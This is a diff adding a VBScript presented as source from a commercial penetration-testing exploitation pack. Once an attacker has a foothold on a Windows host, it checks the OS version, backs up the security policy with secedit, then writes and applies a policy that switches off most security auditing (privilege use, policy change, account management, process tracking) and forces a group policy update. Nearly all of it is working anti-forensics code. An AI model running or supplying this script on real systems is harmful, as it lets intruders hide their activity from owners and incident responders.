@@ -1,0 +1,60 @@
+'
+' Proprietary D2 Exploitation Pack source code - use only under the license
+' agreement specified in LICENSE.txt in your D2 Exploitation Pack
+'
+' Copyright DSquare Security, LLC, 2007-2009
+'
+
+strComputer = "."
+verWin      = ""
+
+Set objWMIService = GetObject("winmgmts:" _
+     & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2" )
+
+Set colItem = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
+
+For each objItem in colItem
+	If InStr(LCase(objItem.Caption), "windows xp") > 0 Then
+		verWin = "XP"
+	End If
+Next
+
+BakCfg = "C:\d2cfg.inf"   
+BakRlbck = "C:\d2rlbck.inf"
+NewCfg =  "C:\d2newcfg.inf"
+Db = "C:\d2cfg.sdb"
+
+Set fs = CreateObject("Scripting.FileSystemObject" )
+Set f = fs.CreateTextFile(NewCfg)
+f.WriteLine "[Unicode]"
+f.WriteLine "Unicode=yes"
+f.WriteLine "[Event Audit]"
+f.WriteLine "AuditSystemEvents = 1"
+f.WriteLine "AuditLogonEvents = 1"
+f.WriteLine "AuditObjectAccess = 1"
+f.WriteLine "AuditPrivilegeUse = 0"
+f.WriteLine "AuditPolicyChange = 0"
+f.WriteLine "AuditAccountManage = 0"
+f.WriteLine "AuditProcessTracking = 0"
+f.WriteLine "AuditDSAccess = 0"
+f.WriteLine "AuditAccountLogon = 0"
+f.WriteLine "[Registry Values]"
+f.WriteLine "[Version]"
+f.WriteLine "signature='$CHICAGO$'"
+f.WriteLine "Revision=1"
+f.Close 
+
+Set WshShellObj = WScript.CreateObject("WScript.Shell") 
+
+If verWin = "XP" Then
+	Wscript.Echo "[D2] Export initial configuration to " & BakRlbck
+	WshShellObj.Run "cmd /c secedit.exe /export /cfg " & BakRlbck	
+Else
+	Wscript.Echo "[D2] Export initial configuration to " & BakCfg & " and " & BakRlbck
+	WshShellObj.Run "secedit /generaterollback /cfg " & BakCfg & " /rbk " & BakRlbck
+End If
+
+Wscript.Echo "[D2] Disabling security auditing"
+WshShellObj.Run "cmd /c secedit.exe /configure /db " & Db & " /cfg " & NewCfg
+WshShellObj.Run "cmd /c gpupdate.exe /force"
+Wscript.Echo "[D2] To restore initial configuration:  secedit /configure /db " & Db & " /cfg " & BakRlbck
